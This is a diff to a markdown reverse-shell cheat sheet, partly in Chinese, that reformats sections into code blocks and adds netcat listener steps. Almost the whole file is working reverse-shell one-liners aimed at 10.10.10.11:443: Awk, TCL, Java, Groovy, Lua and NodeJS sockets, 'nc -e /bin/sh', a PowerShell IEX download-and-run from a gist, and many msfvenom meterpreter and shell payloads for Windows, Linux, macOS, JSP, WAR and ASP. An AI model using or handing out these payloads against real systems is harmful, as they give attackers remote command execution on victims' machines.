@@ -246,44 +246,69 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ```bash
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 ```
-Awk:
+## 13、利用Awk反弹shell
+首先在本地监听TCP协议443端口
 
 ```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
 
+```bash
 awk 'BEGIN {s = "/inet/tcp/0/10.10.10.11/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
-Copy
-TCLsh
+```
+## 14、TCL脚本反弹shell
+首先在本地监听TCP协议443端口
+
+```bash
+nc -lvp 443
+```
+然后在靶机上执行如下命令：
+```bash
 echo 'set s [socket 10.10.10.11 443];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
-Copy
-Java:
+```
+## Java
+
+```java
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.11/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
-Copy
+```
+```java
 String host="127.0.0.1";
 int port=4444;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-Copy
+```
+```java
 Thread thread = new Thread(){
     public void run(){
         // Reverse shell here
     }
 }
 thread.start();
-Copy
-War:
+```
+## War:
+
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
-Copy
-Lua:
+```
+## Lua:
 Linux only
+```bash
+
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.10.11','443');os.execute('/bin/sh -i <&3 >&3 2>&3');"
-Copy
+```
 Windows and Linux
+```bash
+
 lua5.1 -e 'local host, port = "10.10.10.11", 443 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
-Copy
-NodeJS:
+```
+## NodeJS:
+
+```js
+
 (function(){
     var net = require("net"),
         cp = require("child_process"),
@@ -296,49 +321,71 @@ NodeJS:
     });
     return /a/; // Prevents the Node.js application form crashing
 })();
-Copy
+```
+```js
 require('child_process').exec('nc -e /bin/sh 10.10.10.11 443')
-Copy
+```
+```js
 -var x = global.process.mainModule.require
 -x('child_process').exec('nc 10.10.10.11 443 -e /bin/bash')
-Copy
+```
+```bash
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
-Copy
-Groovy:
+```
+
+## Groovy:
+```bash
+
 String host="10.10.10.11";
 int port=443;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
-Copy
+```
 Meterpreter Shell:
+```bash
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe > reverse.exe
-Copy
+```
+```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f exe > reverse.exe
-Copy
+```
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf >reverse.elf
-Copy
+```
+```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.11 LPORT=443 -f elf >reverse.elf
-Copy
+```
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f elf > shell.elf
-Copy
+```
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f exe > shell.exe
-Copy
+```
+```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f macho > shell.macho
-Copy
+```
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.11" LPORT=443 -f asp > shell.asp
-Copy
+```
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f raw > shell.jsp
-Copy
+```
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.11" LPORT=443 -f war > shell.war
-Copy
+```
+```bash
 msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.11" LPORT=443 -f raw > shell.py
-Copy
+```
+```bash
 msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.11" LPORT=443 -f raw > shell.sh
-Copy
+```
+```bash
 msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.11" LPORT=443 -f raw > shell.pl
-Copy
-Xterm:
+```
+## Xterm:
+```bash
+
 xterm -display 10.10.10.11:1
 Xnest :1
 xhost +targetip
-Copy
+```
